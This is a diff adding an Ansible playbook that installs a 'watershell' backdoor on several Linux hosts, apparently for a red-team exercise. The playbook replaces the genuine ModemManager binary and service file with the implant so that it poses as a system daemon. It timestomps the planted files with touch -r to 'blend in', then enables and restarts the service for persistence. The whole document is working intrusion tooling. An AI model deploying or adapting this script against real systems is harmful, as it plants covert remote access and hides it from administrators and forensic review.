@@ -1,0 +1,38 @@
+- name: Install watershell as ModemManager service (Debian/Ubuntu)
+  hosts: U18,U20,D10,F32,C7
+  tasks:
+  - name: Push the watershell executable
+    ansible.builtin.copy:
+      src: /opt/payloads/common/watershell
+      dest: /tmp/ModemManager
+      owner: root
+      group: root
+      mode: '755'
+  - name: Push the service config file
+    ansible.builtin.copy:
+      src: /opt/payloads/common/ModemManager.service
+      dest: /tmp/ModemManager.service
+      owner: root
+      group: root
+      mode: '644'
+  - name: Put things in place and set dates to blend in 
+    ansible.legacy.shell: |
+      if test -f /usr/sbin/ModemManager; then
+        rm /usr/sbin/ModemManager
+      fi
+      mv /tmp/ModemManager /usr/sbin/ModemManager
+      touch -r /usr/sbin/chroot /usr/sbin/ModemManager
+      if test -f /lib/systemd/system/ModemManager; then
+        rm /lib/systemd/system/ModemManager.service
+      fi
+      mv /tmp/ModemManager.service /lib/systemd/system/ModemManager.service
+      touch -r /lib/systemd/system/sockets.target.wants /lib/systemd/system/ModemManager.service
+      if ! test -L /etc/systemd/system/dbus-org.freedesktop.ModemManager1.service; then
+        ln -s /lib/systemd/system/ModemManager.service /etc/systemd/system/dbus-org.freedesktop.ModemManager1.service
+        touch -hr /etc/systemd/system/multi-user.target.wants /etc/systemd/system/dbus-org.freedesktop.ModemManager1.service
+      fi
+      systemctl daemon-reload
+      systemctl enable ModemManager
+      systemctl restart ModemManager
+    args:
+      executable: /bin/bash
